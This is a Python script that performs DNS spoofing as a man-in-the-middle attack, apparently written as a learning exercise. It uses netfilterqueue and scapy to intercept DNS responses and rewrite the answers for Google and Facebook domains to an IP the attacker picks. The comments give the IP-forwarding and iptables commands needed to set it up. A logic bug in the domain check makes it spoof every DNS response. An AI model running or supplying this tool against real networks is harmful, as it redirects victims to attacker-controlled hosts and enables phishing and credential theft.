#!/usr/bin/env python

import netfilterqueue                                    #library to access the queue that is stored using iptables.
import scapy.all as scapy                                #Scapy is a powerful Python-based interactive packet manipulation program and library.


def process_packet(packet):
   scapy_packet=scapy.IP(packet.get_payload())          #wrapping the payload of the packet into IP layer of the scapy packet.
                                                        #this is done to convert the packet into a scapy packet which is easy to interacy with.
   if scapy_packet.haslayer(scapy.DNSRR):               #using the haslayer function to check DNS response in the packet

        qname= scapy_packet[scapy.DNSQR].qname          #storing the qname field from DNS request in qname variable.
        print(scapy_packet.show())
        if "www.google.com" or "www.facebook.com" in qname:             #input the desired to domain that needs to be spoofed.
           # print(scapy_packet.show())

            answer=scapy.DNSRR(rrname=qname, rdata="203.36.190.12")     #crafting a modified packet in DNS response with different IP, according to the attacker's wish.
           #input the your desired ip.
            scapy_packet[scapy.DNS].an=answer                           #replacing modified response packet in the original scapy packet
            scapy_packet[scapy.DNS].ancount=1                           #changing the ancount field according to the number the packet we are transporting.

            del scapy_packet[scapy.IP].len                              #all these should be deleted because it contains the data of the original response.
            del scapy_packet[scapy.IP].chksum                           #but scapy automatically calculates the fields according to the updated value.
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))                        #attaching the crafted packet to the original packet.
            print("spoofing target")
        #print(scapy_packet.show())                                      #it shows the actual content in the packets.
   packet.accept()

queue = netfilterqueue.NetfilterQueue()                                  #creating an instance of netfilterqueue object
queue.bind(1,process_packet)                                             #bind is a method from NetfilteQueue object.
                                                                         # it is used to add the existing iptables list that is created; to the queue instance that we have created.
                                                                         #"1" is the name of the list that we store the iptables content.
                                                                         # process_packet is the call back functionfunction that gets executed for the each packet.
queue.run()                                                              #to run the queue that is created.

#COMMENTS
#attacker should be man in the middle. and allow passing all the packets.
#command to allow passing all the packets - "sysctl -w net.ipv4.ip_forward=1"
#before runninng the script. make sure to run the command to collect all the packets in a queue
# "iptables -I forward -j NFQUEUE --que-num 1" 